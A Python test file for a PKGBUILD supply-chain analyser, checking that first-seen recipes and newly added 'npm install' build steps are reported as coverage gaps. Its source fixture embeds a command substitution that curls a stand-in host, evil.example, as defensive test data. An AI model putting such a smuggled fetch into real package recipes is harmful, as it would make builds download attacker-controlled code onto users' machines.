"""A first analysis must not read as fully covered.

The first-seen paths have no diff to inspect, but the recipe itself is what
the build will run.  These pin the two places that used to answer "nothing
changed" instead: the registry-resolution reader and the corpus first-seen
gap assembly.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from trustsight.analysis.buildfetch import (  # noqa: E402
    has_unpinned_build_deps,
    registry_resolutions,
)
from trustsight.coverage import (  # noqa: E402
    UNPINNED_BUILD_DEPS,
    unresolved_source_lines,
)
from trustsight.diffdoc import as_added_diff  # noqa: E402

RECIPE = """pkgname=demo
pkgver=1
pkgrel=1
prepare() {
  npm install left-pad
}
"""

PREEXISTING = """pkgname=demo
pkgver=1
pkgrel=2
prepare() {
  npm install left-pad
}
"""


def test_first_seen_recipe_registry_install_is_a_gap():
    assert has_unpinned_build_deps("", RECIPE)
    assert registry_resolutions("", RECIPE) == [
        ("prepare", "npm install left-pad")
    ]


def test_incremental_pre_existing_install_stays_quiet():
    """Only an *empty* diff is a first analysis.

    A metadata-only update of a recipe that already runs the manager adds no
    build step; scanning the whole current text there would report every
    pre-existing install as new.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
        " pkgname=demo\n-pkgver=1\n+pkgver=2\n pkgrel=1\n"
    )
    assert not has_unpinned_build_deps(diff, PREEXISTING)


def test_incremental_added_install_is_still_a_gap():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n"
        " pkgname=demo\n pkgver=1\n pkgrel=1\n"
        "+prepare() {\n+\tnpm install left-pad\n+}\n"
    )
    assert has_unpinned_build_deps(diff, None)


def test_all_added_projection_reaches_unresolved_sources():
    recipe = (
        'pkgname=demo\npkgver=1\npkgrel=1\n'
        'source=("x.tar.gz::$(curl -fsSL https://evil.example/x)")\n'
    )
    diff = as_added_diff(recipe)
    assert diff.startswith("--- /dev/null\n+++ b/PKGBUILD")
    assert unresolved_source_lines(diff)


def test_corpus_first_seen_records_the_registry_gap():
    from trustsight.config import ensure_default_configs
    from trustsight.db import init_db
    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text

    ensure_default_configs()
    init_db()
    fact = analyze_package_text(
        pkg_name="first-seen-demo",
        old_pkgbuild=None,
        new_pkgbuild=RECIPE,
        maintainer="tester",
        temporal=TemporalContext(),
    )
    assert UNPINNED_BUILD_DEPS in fact.coverage_gaps
